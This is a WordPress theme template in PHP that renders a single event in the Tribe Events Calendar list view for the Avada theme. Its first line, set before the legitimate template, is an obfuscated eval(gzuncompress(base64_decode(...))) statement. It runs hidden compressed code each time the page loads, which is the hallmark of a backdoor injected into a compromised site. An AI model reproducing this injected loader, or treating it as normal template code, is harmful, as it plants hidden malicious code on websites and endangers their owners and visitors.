<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * List View Single Event
 * This file contains one event in the list view
 *
 * Override this template in your own theme by creating a file at [your-theme]/tribe-events/list/single-event.php
 *
 * @package TribeEventsCalendar
 */

if ( ! defined( 'ABSPATH' ) ) {
	die( '-1' );
}

// Setup an array of venue details for use later in the template.
$venue_details = tribe_get_venue_details();

// Venue microformats.
$has_venue_address = ( ! empty( $venue_details['address'] ) ) ? ' location' : '';

// Organizer.
$organizer = tribe_get_organizer();
?>

<div class="<?php echo ( has_post_thumbnail() ) ? 'fusion-tribe-has-featured-image' : 'fusion-tribe-no-featured-image'; ?>">
	<!-- Event Cost -->
	<?php if ( tribe_get_cost() ) : ?>
		<div class="tribe-events-event-cost">
			<span class="ticket-cost"><?php echo esc_html( tribe_get_cost( null, true ) ); ?></span>
			<?php
			/** This action is documented in the-events-calendar/src/views/list/single-event.php */
			do_action( 'tribe_events_inside_cost' )
			?>
		</div>
	<?php endif; ?>

	<?php if ( has_post_thumbnail() ) :?>
		<div class="fusion-tribe-primary-info">
			<div class="hover-type-<?php echo Avada()->settings->get( 'ec_hover_type' ); ?>">
				<!-- Event Title -->
				<?php do_action( 'tribe_events_before_the_event_title' ) ?>
				<h3 class="tribe-events-list-event-title entry-title summary">
					<a class="tribe-event-url url" href="<?php echo esc_url( tribe_get_event_link() ); ?>" title="<?php the_title_attribute() ?>" rel="bookmark">
						<?php the_title() ?>
					</a>
				</h3>
				<?php do_action( 'tribe_events_after_the_event_title' ) ?>

				<!-- Event Image -->
				<?php $url = wp_get_attachment_url( get_post_thumbnail_id( get_the_ID() ) ); ?>
				<a href="<?php the_permalink(); ?>">
					<?php if ( 'cover' === Avada()->settings->get( 'ec_bg_list_view' ) ) : ?>
						<span class="tribe-events-event-image" style="background-image: url('<?php echo $url; ?>'); -webkit-background-size: <?php echo Avada()->settings->get( 'ec_bg_list_view' ); ?>; background-size: <?php echo Avada()->settings->get( 'ec_bg_list_view' ); ?>; background-position: center center;"></span>
						<span class="fusion-tribe-events-event-image-responsive"><?php the_post_thumbnail(); ?></span>
					<?php else : ?>
						<?php the_post_thumbnail(); ?>
					<?php endif; ?>
				</a>
			</div>
		</div>
	<?php endif; ?>

	<div class="fusion-tribe-secondary-info">
		<!-- Event Meta -->
		<?php do_action( 'tribe_events_before_the_meta' ) ?>
		<?php tribe_get_template_part( 'list/meta' ); ?>
		<?php do_action( 'tribe_events_after_the_meta' ) ?>

		<!-- Event Content -->
		<?php do_action( 'tribe_events_before_the_content' ) ?>
		<div class="tribe-events-list-event-description tribe-events-content description entry-summary">
			<?php echo tribe_events_get_the_excerpt( null, wp_kses_allowed_html( 'post' ) ); ?>
			<a href="<?php echo esc_url( tribe_get_event_link() ); ?>" class="fusion-read-more" rel="bookmark"><?php esc_html_e( 'Find out more', 'the-events-calendar' ) ?></a>
		</div><!-- .tribe-events-list-event-description -->
		<?php do_action( 'tribe_events_after_the_content' ); ?>
	</div>
</div>
